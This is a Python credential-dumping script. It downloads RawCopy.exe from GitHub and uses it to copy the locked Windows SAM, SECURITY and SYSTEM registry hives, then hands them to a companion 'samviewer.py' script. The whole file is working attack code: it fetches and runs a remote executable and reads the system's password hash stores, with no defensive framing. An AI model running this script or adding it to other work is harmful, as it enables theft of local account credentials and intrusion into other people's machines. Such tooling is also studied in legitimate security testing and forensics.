import os
import subprocess
import urllib.request
import shutil
import sys
from pathlib import Path

RAWCOPY_URL = "https://github.com/jschicht/RawCopy/raw/master/RawCopy.exe"
RAWCOPY_EXE = "RawCopy.exe"

TARGETS = [
    ("C:\\Windows\\System32\\config\\SAM", "SAM", "SAM_dumped", "SAM_Unlocked"),
    ("C:\\Windows\\System32\\config\\SECURITY", "SECURITY", "SECURITY_dumped", "SECURITY_Unlocked"),
    ("C:\\Windows\\System32\\config\\SYSTEM", "SYSTEM", "SYSTEM_dumped", "SYSTEM_Unlocked"),
]

def download_rawcopy():
    print("[*] Downloading RawCopy.exe...")
    try:
        urllib.request.urlretrieve(RAWCOPY_URL, RAWCOPY_EXE)
        print(f"[+] RawCopy.exe downloaded to: {os.path.abspath(RAWCOPY_EXE)}")
        return True
    except Exception as e:
        print(f"[-] Failed to download RawCopy.exe: {e}")
        return False

def run_rawcopy_for_file(file_path, raw_output, temp_output, final_output):
    print(f"[*] Extracting {os.path.basename(file_path)}...")
    command = [RAWCOPY_EXE, f"/FileNamePath:{file_path}"]
    result = subprocess.run(command, capture_output=True, text=True)
    print("[*] RawCopy Output:\n", result.stdout)

    if result.returncode == 0 and os.path.exists(raw_output):
        os.rename(raw_output, temp_output)
        print(f"[+] File dumped and renamed to: {temp_output}")

        try:
            shutil.copy2(temp_output, final_output)
            print(f"[+] File copied to: {final_output}")
        except Exception as e:
            print(f"[-] Failed to copy file: {e}")

        try:
            os.remove(temp_output)
            print(f"[+] Temporary file {temp_output} deleted.")
        except Exception as e:
            print(f"[-] Failed to delete temporary file: {e}")
    else:
        print(f"[-] Failed to extract or locate {raw_output}.")
        print("[!] STDERR:\n", result.stderr)

def main():
    if not os.path.exists(RAWCOPY_EXE):
        print("[!] RawCopy.exe not found. Downloading now...")
        if not download_rawcopy():
            return

    for file_path, raw_out, temp_out, final_out in TARGETS:
        run_rawcopy_for_file(file_path, raw_out, temp_out, final_out)

if __name__ == "__main__":
    main()

    script_dir = Path(__file__).parent.resolve()
    hive_dir = str(script_dir)

    print("\n[*] Launching samviewer in the current console window...")
    subprocess.run([
        sys.executable,
        str(script_dir / "samviewer.py"),
        "--hive", hive_dir
    ])